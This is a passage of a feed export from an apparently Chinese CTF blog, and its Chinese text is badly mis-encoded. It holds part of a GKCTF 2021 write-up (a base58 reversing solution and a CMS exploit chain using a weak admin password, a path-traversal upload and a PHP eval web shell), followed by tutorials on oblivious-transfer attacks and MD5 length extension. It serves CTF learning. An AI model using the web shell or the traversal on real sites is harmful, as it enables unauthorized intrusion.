class="keyword">char</span>)v11[v10]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 &lt;= v9 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !MEMORY[<span class="number">0x7C1A</span>](v24, <span class="string">&quot;56fkoP8KhwCf3v7CEz&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">      v12 = <span class="built_in">strlen</span>(v19);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v12 = <span class="number">-1</span>;</span><br><span class="line">    v22 = (_BYTE *)MEMORY[<span class="number">0x7CCC</span>](v19, v12);</span><br><span class="line">    LOBYTE(v26) = <span class="number">2</span>;</span><br><span class="line">    v21 = MEMORY[<span class="number">0x7CCC</span>](<span class="string">&quot;flag&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    LOBYTE(v26) = <span class="number">3</span>;</span><br><span class="line">    MEMORY[<span class="number">0x6124</span>](<span class="keyword">this</span>, &amp;v21, &amp;v22, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    MEMORY[<span class="number">0x7C66</span>](&amp;v21);</span><br><span class="line">    MEMORY[<span class="number">0x7C66</span>](&amp;v22);</span><br><span class="line">  &#125;</span><br><span class="line">  MEMORY[<span class="number">0x7C30</span>](v17);</span><br><span class="line">  <span class="keyword">return</span> MEMORY[<span class="number">0x7C66</span>]();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç é€»è¾‘çŸ¥å°†è¾“å…¥å­—ç¬¦ä¸²base58ç¼–ç åçš„ç»“æœä¸å­—ç¬¦ä¸² <code>56fkoP8KhwCf3v7CEz</code> æ¯”å¯¹ï¼Œç›´æ¥base58è§£ç  <code>56fkoP8KhwCf3v7CEz</code> å¾—åˆ° <code>12t4tww3r5e77</code>ã€‚åŠ å¤´å³flagã€‚</p><p>â€‹    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><blockquote><p>çœŸÂ·ezcms</p><p>hint: åå°å¯†ç 5ä½å¼±å£ä»¤</p></blockquote><p>è‰çŸ¥cmsï¼Œæœç´¢çŸ¥è¯¥cmså­˜åœ¨<strong>åå°ä»»æ„æ–‡ä»¶è¯»å–</strong>ä¸<strong>åå°Getshell</strong>æ¼æ´ã€‚</p><p>è®¿é—® <code>admin.php</code>ï¼Œæ ¹æ®æç¤ºç”¨ <code>admin/12345</code> ç™»è¿›åå°ï¼Œåœ¨<strong>è®¾è®¡-é«˜çº§</strong>é‡Œé¢å¯ä»¥ç›´æ¥ç¼–è¾‘phpæ¨¡æ¿æ–‡ä»¶ï¼š</p><p><img src="/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/20210626191309.png" alt="20210626191309" style="zoom:80%;"></p><p>åœ¨æºç é‡ŒåŠ ä¸Šä¸€å¥è¯å´å‘ç°éœ€è¦éªŒè¯ç”¨æˆ·æƒé™ï¼š</p><p><img src="/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/20210626191605.png" alt="20210626191605" style="zoom:80%;"></p><p>å¦‚æœç¼–è¾‘æ¨¡æ¿ï¼Œéœ€è¦ç®¡ç†å‘˜åœ¨cmsçš„ <code>/system/tmp</code> ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåå­—ä¸º <code>xgem.txt</code> çš„æ–‡ä»¶æ¥éªŒè¯æ˜¯å¦æœ‰å†™å…¥æƒé™ã€‚</p><p>åœ¨<strong>è®¾è®¡-ç»„ä»¶-ç´ æåº“</strong>å¯ä»¥ä¸Šä¼ ç´ æï¼Œå¹¶ä¸”å¯ä»¥è·¨ç›®å½•ä¸Šä¼ æ–‡ä»¶ã€‚æœ¬åœ°æ–°å»ºä¸€ä¸ª <code>xgem.txt</code> æ–‡ä»¶ï¼Œä¸Šä¼ åæŠŠåç§°çš„å‚æ•°æ”¹ä¸º <code>../../../../../system/tmp/xgem</code>ï¼š</p><p><img src="/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/20210626191957.png" alt="20210626191957" style="zoom:80%;"></p><p>å†å›åˆ°<strong>è®¾è®¡-é«˜çº§</strong>æ¨¡æ¿ç¼–è¾‘ç•Œé¢ï¼Œå°è¯•åœ¨é¦–é¡µæ¨¡æ¿æ–‡ä»¶ <code>/var/www/html/system/tmp/template/default/index/index.html.php</code> ä¸­é¦–è¡Œæ·»åŠ  <code>&lt;?php phpinfo();?&gt;</code>ï¼Œä¿å­˜ã€‚</p><p>å›åˆ°é¦–é¡µå‘ç°æ‰§è¡ŒæˆåŠŸï¼š</p><p><img src="/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/20210626192413.png" alt="20210626192413" style="zoom:80%;"></p><p>å°†ä»£ç æ”¹ä¸ºä¸€å¥è¯ <code>&lt;?php @eval($_POST[ccc]);?&gt;</code>ï¼Œèšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•è®¿é—®æ–‡ä»¶ <code>/flag</code> å¾—åˆ°flagã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;æŒ‡å¯¼å•ä½: ä¸­å›½ç§»åŠ¨é€šä¿¡è”åˆä¼š&lt;br&gt;ä¸»åŠå•ä½: é˜²ç¾ç§‘æŠ€å­¦é™¢ä¿¡æ¯å·¥ç¨‹å­¦é™¢æ­å·å®‰æ’ä¿¡æ¯æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸&lt;br&gt;æœ¬æ¬¡å‘½é¢˜: Ginkgoæˆ˜é˜Ÿ&lt;br&gt;æ¯”èµ›æ—¶é—´: 2021å¹´6æœˆ26æ—¥09:00-17:00&lt;br&gt;æŠ¥åæ—¶é—´: 2021å¹´6æœˆ21æ—¥19:3</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021èµ›" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>ä¸ç»æ„ä¼ è¾“</title>
    <link href="https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/"/>
    <id>https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/</id>
    <published>2021-06-20T04:07:57.000Z</published>
    <updated>2021-06-20T05:29:24.471Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p><strong>ä¸ç»æ„ä¼ è¾“ï¼ˆOblivious Transfer, OTï¼‰</strong>æ˜¯ä¸€ç§å¯ä¿æŠ¤éšç§çš„åŒæ–¹é€šä¿¡åè®®ã€æ¥å—è€…çš„éšç§ä¸è¢«å‘é€è€…æ‰€çŸ¥é“ï¼Œä½¿é€šä¿¡åŒæ–¹ä»¥ä¸€ç§é€‰æ‹©æ¨¡ç³ŠåŒ–çš„æ–¹å¼ä¼ é€æ¶ˆæ¯ã€‚æŠ½è±¡åœ°è®²ï¼Œå°±æ˜¯Aç»™Bå‘æ¶ˆæ¯ï¼ŒAå´ä¸çŸ¥é“Bæ”¶åˆ°çš„æ˜¯å•¥ï¼Œä¸€èˆ¬çš„æ€è·¯å°±æ˜¯Aè¦å¤šå‘ä¸€äº›æ¶ˆæ¯ç„¶åè®©Bå»é€‰æ‹©æœ‰éœ€è¦çš„ï¼Œå¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼ŒåŒæ—¶è¿˜åº”è¯¥ä¿è¯Bä¸ä¼šå¤šçŸ¥é“ä»–æœ¬ä¸åº”è¯¥çŸ¥é“çš„æ¶ˆæ¯ã€‚ä¸ç»æ„ä¼ è¾“å¯ä»¥åˆ†ä¸º1é€‰1ã€2é€‰1ã€né€‰1ã€né€‰kå¤šç§ä¸ç»æ„ä¼ è¾“åè®®ã€‚</p><h3 id="1é€‰1"><a href="#1é€‰1" class="headerlink" title="1é€‰1"></a>1é€‰1</h3><p>Aç»™Bå‘é€ä¸€æ¡æ¶ˆæ¯ï¼ŒBåªæœ‰ $\frac{1}{2}$ çš„æ¦‚ç‡èƒ½å¤Ÿæ¥å—åˆ°çœŸæ­£çš„æ¶ˆæ¯ï¼Œä¸”Aä¸çŸ¥é“Bæ˜¯å¦çœŸæ­£æ¥å—äº†æ¶ˆæ¯ã€‚</p><ol><li><p>Aå–ä¸¤ä¸ªç´ æ•° $p,q$ï¼Œè®¡ç®— $n=pq$ï¼Œå°† $n$ å‘é€ç»™Bï¼›</p></li><li><p>Bä»»å– $x,x \in (0,n),\gcd(x,n)=1$ï¼Œè®¡ç®— $a=x^2 \bmod n$ï¼Œå°† $a$ å‘é€ç»™Aï¼›</p></li><li><p>AçŸ¥é“ $p,q$ï¼Œå¯ä»¥è®¡ç®— $a=x^2 \bmod n$ çš„å››ä¸ªæ ¹ $(x,n-x,y,n-y)$ï¼Œä»ä¸­éšæœºæŒ‘é€‰ä¸€ä¸ªé€ç»™Bï¼›</p></li><li><p>Bè‹¥æ”¶åˆ° $y$ æˆ– $n-y$ï¼Œåˆ™å¯è®¡ç®— $p,q$ï¼š$\gcd(x+y,n)=p$ æˆ– $\gcd(x+y,n)=q$ï¼›</p><p>Bè‹¥æ”¶åˆ° $x$ æˆ– $n-x$ï¼Œåˆ™Bä»€ä¹ˆä¹Ÿå¾—ä¸åˆ°ã€‚</p><p>â€‹    </p></li></ol><h3 id="2é€‰1"><a href="#2é€‰1" class="headerlink" title="2é€‰1"></a>2é€‰1</h3><p>Aç»™Bå‘é€ä¸¤æ¡æ¶ˆæ¯ $(m_0, m_1)$ï¼ŒBèƒ½å¤Ÿåœ¨ä¸çŸ¥é“å¦å¤–ä¸€æ¡æ¶ˆæ¯çš„å†…å®¹çš„æƒ…å†µä¸‹å¾—çŸ¥å…¶ä¸­ä¸€æ¡æ¶ˆæ¯çš„å†…å®¹ï¼Œä¸”Aä¸çŸ¥é“Bé€‰æ‹©çš„å“ªæ¡æ¶ˆæ¯ã€‚</p><ul><li><h4 id="RSAå®ç°"><a href="#RSAå®ç°" class="headerlink" title="RSAå®ç°"></a>RSAå®ç°</h4><ol><li><p>Aæœ‰ä¸¤ä¸ªç§˜å¯†æ¶ˆæ¯ $m_0,m_1$ï¼›</p></li><li><p>Aä½¿ç”¨RSAç®—æ³•ï¼Œç”Ÿæˆå…¬é’¥ $(N,e)$ å¯¹å…¬å¼€ï¼Œç§é’¥ $d$ è‡ªå·±ç•™ç€ã€‚å…¬é’¥ $(N,e)$ å‘ŠçŸ¥Bï¼›</p><p>ï¼ˆæ¯æ¬¡é€šä¿¡çš„æ—¶å€™RSAéƒ½è¦é‡æ–°ç”Ÿæˆä¸€å¯¹å…¬é’¥ç§é’¥ï¼‰</p></li><li><p>Aäº§ç”Ÿä¸¤ä¸ªéšæœºæ•° $x_0,x_1$ï¼Œå¹¶ä¸”å°†è¿™ä¸¤ä¸ªéšæœºæ•°ä¼ è¾“ç»™Bï¼›</p></li><li><p>Bå†³å®šè¦è·å–çš„æ•°å­—ç¼–å· $b=\{0,1\}$ï¼Œä»¥åŠäº§ç”Ÿä¸€ä¸ªéšæœºæ•° $k$ï¼›</p></li><li><p>Bè®¡ç®—ä¸€ä¸ªæ•°å­— $v=(x_b+k^e) \bmod N$ï¼Œå¹¶ä¸”å°†è¿™ä¸ª $v$ å‘é€ç»™Aï¼›</p></li><li><p>Aè®¡ç®—å¤šä¸ª $k_i$ï¼Œå…¶ä¸­ä¸€ä¸ª $k_i$ å°†ä¼šç­‰äº $k$ï¼š</p><p>$k_0=(v-x_0)^d \bmod N \ k_1=(v-x_1)^d \bmod N$</p><p>ç”±äºæ­¤æ—¶ $v$ å¹¶ä¸æ˜¯Aäº§ç”Ÿçš„ï¼Œæ‰€ä»¥æ­¤æ—¶çš„Aå¹¶ä¸çŸ¥é“å“ªä¸€ä¸ª $k$ æ˜¯Béœ€è¦çš„ï¼›</p></li><li><p>Aå°†ç”Ÿæˆçš„å€¼ä¸è‡ªå·±æ‰‹ä¸Šçš„ä¿¡æ¯è¿›è¡Œç›¸åŠ ï¼Œå¾—åˆ°å…¨æ–°çš„ä¿¡æ¯ï¼š</p><p>$m_0â€™=m_0+k_0 \ m_1â€™=m_1+k_1$</p><p>å¹¶å°†ä¿¡æ¯å‘é€ç»™Bã€‚å› ä¸ºæ­¤æ—¶æ¯ä¸€ä¸ªä¿¡æ¯éƒ½å¢åŠ äº† $k_i$ï¼Œæ‰€ä»¥Bæ— æ³•ç›´æ¥è¿˜åŸä¿¡æ¯ $m$ï¼›</p></li><li><p>Bæ­¤æ—¶çŸ¥é“è‡ªå·±é€‰æ‹©çš„ä¿¡æ¯ç¼–å· $b$ï¼Œäºæ˜¯é€‰å‡º $m_b$ï¼Œè®¡ç®—å‡º $k_b$ï¼Œå¹¶ä¸”ç”¨ $m_b=m_bâ€™-k_b$ å¾—åˆ°æ­¤æ—¶çš„è§£å¯†ä¿¡æ¯ã€‚</p></li></ol><ul><li><h5 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h5><ul><li><p>æ„é€  $v$ å¾— $m_0,m_1$</p><p>$v=\cfrac{\text{scale}^e \cdot x_0-x_1}{\text{scale}^e-1}$</p><p>å¯ä½¿ $k_1=\text{scale} \cdot k_0$ï¼Œå› æ­¤ $\text{scale} \cdot m_0â€™-m_1â€™=m_0 \cdot \text{scale} -m_1$ã€‚</p><p>é¦–å…ˆï¼Œå¦‚æœæ°å·§éšæœºæ•° $m_0$ å’Œ $m_1$ éƒ½å°äº $\text{scale}$ï¼Œé‚£ä¹ˆç›´æ¥å¯ä»¥ä» $m_0 \cdot \text{scale} -m_1$ å°†ä¸¤è€…æ±‚å‡ºã€‚</p><p>å…¶æ¬¡ï¼Œå¦‚æœ $\text{scale}$ å–å€¼ä¸èƒ½å–å¾—å¤ªå¤§ï¼Œè€Œå¯¼è‡´ä¸¤ä¸ª $m$ æ€»æ˜¯æ¯”å®ƒå¤§ï¼Œé‚£åªèƒ½è€è€å®å®ç©·ä¸¾å¯èƒ½çš„ä½å­—èŠ‚ï¼Œå†å‘é«˜å­—èŠ‚æœç´¢ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/eAJWraah9OOgJfZOhm4Sqg">Pwnhub - BabyOT</a></p><p><a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/README.md">Hackergame 2020 - ä¸ç»æ„ä¼ è¾“</a></p></li></ul></li></ul></li></ul><ul><li><h4 id="å…¶ä»–å®ç°"><a href="#å…¶ä»–å®ç°" class="headerlink" title="å…¶ä»–å®ç°"></a>å…¶ä»–å®ç°</h4><ol><li><p>Aå‘é€ $g^s$ ç»™Bï¼ŒBçŸ¥é“ $g$ å’Œ $g^s$ ä¹Ÿæ— æ³•ç ´è¯‘ $s$ï¼Œå› ä¸ºDLPé—®é¢˜ä¸å­˜åœ¨é«˜æ•ˆè§£æ³•ï¼›</p></li><li><p>BåŸºäº $i$ ç”Ÿæˆ $L_i=\begin{cases} g^k ,&amp; i=0 \ g^{s-k} ,&amp; i=1 \end{cases}$ï¼›</p></li><li><p>Bå‘é€ $L_i$ ç»™Aï¼ŒAçŸ¥é“ $g$ å’Œ $g_k$ ä¹Ÿæ— æ³•ç ´è¯‘ $k$ï¼Œå› ä¸ºDLPé—®é¢˜ä¸å­˜åœ¨é«˜æ•ˆè§£æ³•ã€‚</p><p>å› æ­¤ï¼ŒAæ— æ³•çŸ¥é“Bå‘æ¥çš„æ˜¯ $g_k$ è¿˜æ˜¯ $g_{s-k}$ï¼Œä¹Ÿå°±æ— æ³•çŸ¥é“ $i$ï¼›</p></li><li><p>Aç”Ÿæˆ $C_0,C_1$ï¼š</p><p>$C_0=(g^{r_0},(L_i)^{r_0} \oplus v_0)\ C_1=(g^{r_1},(\frac{g^s}{L_i})^{r_1} \oplus v_1)$</p></li><li><p>Aå‘é€ $C_0,C_1$ ç»™Bï¼ŒBçŸ¥é“ $g,g^{r_0},g^{r_1}$ ä¹Ÿæ— æ³•ç ´è¯‘ $r_0,r_1$ï¼Œå› ä¸ºDLPé—®é¢˜ä¸å­˜åœ¨é«˜æ•ˆè§£æ³•ã€‚</p></li><li><p>Bè§£å¯† $v_i$ï¼š</p><p>(1) å¯¹äº $i=0$ çš„æƒ…å½¢ï¼š</p><p>Bå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼è§£å¯†è·å¾— $v_0$ï¼š</p><p>$C_0[0]^k \oplus C_0[1]=(g^{r_0})^k \oplus (L_i)^{r_0} \oplus v_0=(g^{r_0})^k \oplus (g^k)^{r_0} \oplus v_0=v_0$</p><p>Bæ— æ³•è·å¾— $v_1$ å› ä¸º $C_1[1]=(\frac{g^s}{L_i})^{r_1} \oplus v_1=g^{(s-k)r_1} \oplus v_1$ï¼Œè€Œ Bä¸çŸ¥é“ $s,r_1$ã€‚</p><p>(2) å¯¹äº $i=1$ çš„æƒ…å½¢ï¼š</p><p>Bå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼è§£å¯†è·å¾— $v_1$ï¼š</p><p>$C_1[0]^k \oplus C_1[1]=(g^{r_1})^k \oplus (L_i)^{r_1} \oplus v_1=(g^{r_1})^k \oplus (g^k)^{r_1} \oplus v_1=v_1$</p><p>Bæ— æ³•è·å¾— $v_0$ å› ä¸º $C_0[1]=(L_i)^{r_0} \oplus v_0=g^{(s-k)r_0} \oplus v_0$ï¼Œè€Œ Bä¸çŸ¥é“ $s,r_0$ã€‚</p></li><li><p>å› æ­¤ï¼ŒBåªèƒ½è§£å¯† $v_i$ è€Œä¸èƒ½è§£å¯† $v_{1-i}$ã€‚</p></li></ol></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä¸ç»æ„ä¼ è¾“ï¼ˆOblivious Transfer, OTï¼‰&lt;/strong&gt;æ˜¯ä¸€ç§å¯ä¿æŠ¤éšç§çš„åŒæ–¹é€šä¿¡åè®®ã€æ¥å—è€…çš„éšç§ä¸è¢«å‘é€è€…æ‰€çŸ¥é“ï¼Œä½¿é€šä¿¡åŒæ–¹ä»¥ä¸€ç§é€‰æ‹©æ¨¡ç³ŠåŒ–çš„æ–¹å¼ä¼ é€æ¶ˆæ¯ã€‚æŠ½è±¡åœ°è®²ï¼Œå°±æ˜¯Aç»™Bå‘æ¶ˆæ¯ï¼ŒAå´ä¸çŸ¥é“Bæ”¶åˆ°çš„æ˜¯å•¥ï¼Œ</summary>
      
    
    
    
    <category term="crypto" scheme="https://lazzzaro.github.io/categories/crypto/"/>
    
    
    <category term="OT" scheme="https://lazzzaro.github.io/tags/OT/"/>
    
  </entry>
  
  <entry>
    <title>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</title>
    <link href="https://lazzzaro.github.io/2021/06/02/crypto-%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>https://lazzzaro.github.io/2021/06/02/crypto-%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</id>
    <published>2021-06-01T16:02:52.000Z</published>
    <updated>2022-06-01T16:25:46.363Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><h2 id="å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»"><a href="#å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»" class="headerlink" title="å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»"></a>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</h2><p><strong>åŸç†</strong></p><p>åœ¨å¯†ç å­¦å’Œè®¡ç®—æœºå®‰å…¨ä¸­ï¼Œ<strong>é•¿åº¦æ‰©å±•æ”»å‡»ï¼ˆLength extension attacksï¼‰</strong>æ˜¯æŒ‡é’ˆå¯¹æŸäº›å…è®¸åŒ…å«é¢å¤–ä¿¡æ¯çš„åŠ å¯†æ•£åˆ—å‡½æ•°çš„æ”»å‡»æ‰‹æ®µã€‚ è¯¥æ”»å‡»é€‚ç”¨äºåœ¨<strong>æ¶ˆæ¯</strong>ä¸<strong>å¯†é’¥</strong>çš„é•¿åº¦å·²çŸ¥çš„æƒ…å½¢ä¸‹ï¼Œæ‰€æœ‰é‡‡å–äº† <code>H(key||message)</code> æ­¤ç±»æ„é€ çš„æ•£åˆ—å‡½æ•°ã€‚MD5å’ŒSHA-1ç­‰åŸºäºMerkleâ€“DamgÃ¥rdæ„é€ çš„ç®—æ³•å‡å¯¹æ­¤ç±»æ”»å‡»æ˜¾ç¤ºå‡ºè„†å¼±æ€§ã€‚</p><p>æ”»å‡»çš„è¦ç‚¹åœ¨äºï¼š</p><ul><li>æ”»å‡»è€…å¯ä»¥æ§åˆ¶message</li><li>æ”»å‡»è€…éœ€è¦çŸ¥é“keyçš„é•¿åº¦ï¼Œå¦‚ä¸çŸ¥é“å¯ä»¥è€ƒè™‘æš´åŠ›ç ´è§£</li><li>æ”»å‡»å·²ç»çŸ¥é“äº†åŒ…å«keyçš„ä¸€ä¸ªæ¶ˆæ¯çš„hashå€¼</li><li>hashç®—æ³•ä½¿ç”¨äº†Merkleâ€“DamgÃ¥rd constructionè¿›è¡Œæ•°æ®çš„å‹ç¼©ï¼ˆæ¯”å¦‚MD5ã€SHA-1ç­‰ï¼‰å¹¶é‡‡å– <code>H(key||message)</code> æ„é€ </li></ul><p>æ”»å‡»å¯ä»¥è¾¾åˆ°çš„æ•ˆæœåœ¨äºï¼Œå¦‚æœçŸ¥é“ä¸€ä¸ªåŸæ¶ˆæ¯å“ˆå¸Œå€¼ <code>H(key||M1)</code> åŠå…¶ <code>key||M1</code> é•¿åº¦ï¼Œå¯¹äºä»»æ„çš„å­—ç¬¦ä¸²<code>M2</code>ï¼Œæ”»å‡»è€…å¯ä»¥è®¡ç®—å‡º <code>H(pad(key||M1) + M2)</code> çš„å€¼ï¼Œè€Œä¸éœ€è¦çŸ¥é“æ˜¯ <code>key</code> åŠ <code>M1</code> æ˜¯å¤šå°‘ã€‚</p><p>ä»¥åŒºå—ä¸ºå•ä½æ“ä½œæ•°æ®ï¼ˆMD5, SHA1, SHA256çš„åŒºå—é•¿åº¦æ˜¯512 bitsï¼Œå¤§å¤šæ•°messageçš„é•¿åº¦ä¸ä¼šåˆšå¥½å¯ä»¥è¢«å“ˆå¸Œå‡½æ•°çš„åŒºå—é•¿åº¦æ•´é™¤ã€‚è¿™æ ·ä¸€æ¥ï¼Œmessageå°±å¿…é¡»è¢«å¡«å……(padding)è‡³åŒºå—é•¿åº¦çš„æ•´æ•°å€ï¼‰ã€‚</p><p>æ¯ä¸ªæ¶ˆæ¯å—éƒ½ä¼šå’Œä¸€ä¸ªè¾“å…¥å‘é‡åšä¸€ä¸ªè¿ç®—ï¼ŒæŠŠè¿™ä¸ªè®¡ç®—ç»“æœå½“æˆä¸‹ä¸ªæ¶ˆæ¯å—çš„è¾“å…¥å‘é‡ ï¼Œåˆå§‹åŒ–å‘é‡æ˜¯å®šä¹‰å¥½çš„ï¼Œåœ¨æœ€åä¸€å—çš„æ—¶å€™ï¼Œæ‰ä¼šå°†å…¶å¯¹åº”çš„é“¾æ¥å˜é‡è½¬æ¢ä¸ºhashå€¼ã€‚</p><p>ç”±å·²çŸ¥çš„MD5å€¼é€†å‘å¾—åˆ°å¯¹åº”çš„é“¾æ¥å˜é‡ï¼Œåˆ©ç”¨å¾—åˆ°çš„é“¾æ¥å˜é‡å¯¹å¡«å……åçš„æ–°åŠ çš„æ¶ˆæ¯è¿›è¡Œå“ˆå¸Œç®—æ³•ï¼Œæœ€åå¾—åˆ°hashå€¼ã€‚</p><p><strong>æ­¥éª¤</strong></p><p>MD5æ“ä½œæµç¨‹ï¼š</p><p><img src="/2021/06/02/crypto-%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/20180813125243-b731fe76-9eb4-1.png" alt="20180813125243-b731fe76-9eb4-1" style="zoom: 67%;"></p><p>ç”¨ md5 å‡½æ•°ä½œä¸ºä¾‹å­ã€‚ md5 ç®—æ³•åœ¨è®¡ç®—çš„æ—¶å€™ä¼šåˆå§‹åŒ–å››ä¸ªå¯„å­˜å™¨ <code>Aã€Bã€Cã€D</code>ï¼Œåˆ†åˆ«æœ‰è‡ªå·±çš„åˆå§‹å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">word A: 01 23 45 67</span><br><span class="line">word B: 89 ab cd ef</span><br><span class="line">word C: fe dc ba 98</span><br><span class="line">word D: 76 54 32 10</span><br></pre></td></tr></table></figure><p>md5 ç®—æ³•æ˜¯ä»¥ 512bit ä¸ºä¸€ä¸ªå—è¿›è¡Œè¿­ä»£è®¡ç®—çš„ï¼Œç¬¬ä¸€ä¸ªå—è®¡ç®—å®Œåï¼Œå››ä¸ªå¯„å­˜å™¨çš„å€¼å°±ä¼šè¢«æ›´æ–°ï¼Œå¦‚æœè¿˜å­˜åœ¨ä¸‹ä¸€ä¸ªå—ï¼Œå°±ä¼šåœ¨ç°åœ¨å››ä¸ªå¯„å­˜å™¨é‡Œé¢çš„æ•°å€¼çš„åŸºç¡€ä¸Šç»§ç»­è¿­ä»£è®¡ç®—ï¼Œç­‰å…¨éƒ¨çš„å—è®¡ç®—å®Œæˆåï¼Œå››ä¸ªå¯„å­˜å™¨ä¸­çš„åå…­è¿›åˆ¶è¿æ¥èµ·æ¥ï¼Œå°±æ˜¯æœ€ç»ˆçš„ MD5 å€¼ã€‚æ¢å¥è¯è¯´ï¼Œä¹Ÿå°±æ˜¯å½“ç¬¬ä¸€ä¸ªå—è®¡ç®—å®Œæˆåï¼Œæ­¤æ—¶å››ä¸ªå¯„å­˜å™¨ä¸­å­˜å‚¨çš„å°±æ˜¯ç¬¬ä¸€ä¸ªå—çš„ MD5 å€¼ï¼Œæ¥ç€åœ¨è¿™ä¸ªåŸºç¡€ä¸Šç»§ç»­è¿­ä»£è®¡ç®—ä¸‹ä¸€ä¸ªå—ã€‚</p><p>å¦‚æœå½“å‰çš„æ•°æ®é•¿åº¦ä¸æ»¡è¶³å¯¹ 512bit æ±‚ä½™ä¸º 448bit çš„æ—¶å€™ï¼Œéœ€è¦è¡¥è‡³æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œå¡«å……çš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><ol><li><p>é¦–å…ˆè¡¥ä¸€ä¸ª 1ï¼ˆäºŒè¿›åˆ¶ä½ä¸Šçš„ä¸€ä¸ª 1ï¼Œä¸æ˜¯åè¿›åˆ¶çš„ 1ï¼‰</p></li><li><p>æ¥ç€åœ¨åé¢è¡¥ 0ï¼ˆåŒæ ·æ˜¯äºŒè¿›åˆ¶ä½ä¸Šçš„ 0ï¼‰ï¼Œç›´åˆ°æ»¡è¶³æ¯”ç‰¹é•¿åº¦å¯¹ 512 æ±‚ä½™ä¸º 448 è¿™ä¸ªæ¡ä»¶ã€‚</p></li><li><p>æ¥ç€è¡¥ 64bit çš„é•¿åº¦ï¼Œè¿™ä¸ªé•¿åº¦æ˜¯åœ¨è¡¥ 1 å’Œ 0 ä»¥å‰çš„é•¿åº¦ï¼Œå¦‚æœé•¿åº¦è¶…å‡ºäº† 64bitï¼Œé‚£ä¹ˆå°±å–ä½ 64bitã€‚<br>æ¢å¥è¯è¯´ï¼šè¡¥å®Œçš„ä¸€ä¸ªå—å¯èƒ½æ˜¯è¿™ä¸ªæ ·å­çš„ï¼š</p><p><code>raw_data + &#39;\x80&#39; + &#39;\x00&#39;*n + &#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;</code></p></li></ol><p>ç¬¬ä¸€ä¸ª <code>raw_data</code> çš„éƒ¨åˆ†å°±æ˜¯åŸå§‹çš„æ•°æ®ï¼Œç¬¬äºŒä¸ªéƒ¨åˆ† <code>\x80</code> æ˜¯ä¸€å¼€å§‹è¡¥çš„ä¸€ä¸ªäºŒè¿›åˆ¶ä½ 1ï¼Œæ¥ç€è¡¥è‹¥å¹²ä¸ª <code>\ x00</code>ï¼Œç›´åˆ°æ•´ä¸ªé•¿åº¦è¾¾åˆ° 56Byteï¼Œæœ€åçš„ 8Byte å°±æ˜¯ <code>raw_data</code> çš„é•¿åº¦ï¼Œå¦‚æœ <code>raw_data</code> çš„é•¿åº¦è¶…è¿‡äº† 2^64bitï¼Œåˆ™å–ä½ 64bitã€‚</p><p> MD5 ç®—æ³•ä¸­çš„è¡¥ä½çš„è¿™éƒ¨åˆ†ï¼Œå°±æ˜¯å®ç°é•¿åº¦æ‰©å±•æ”»å‡»çš„å…³é”®ã€‚</p><p>é€šè¿‡é•¿åº¦æ‰©å±•æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ md5 çš„ä¸€äº› trick 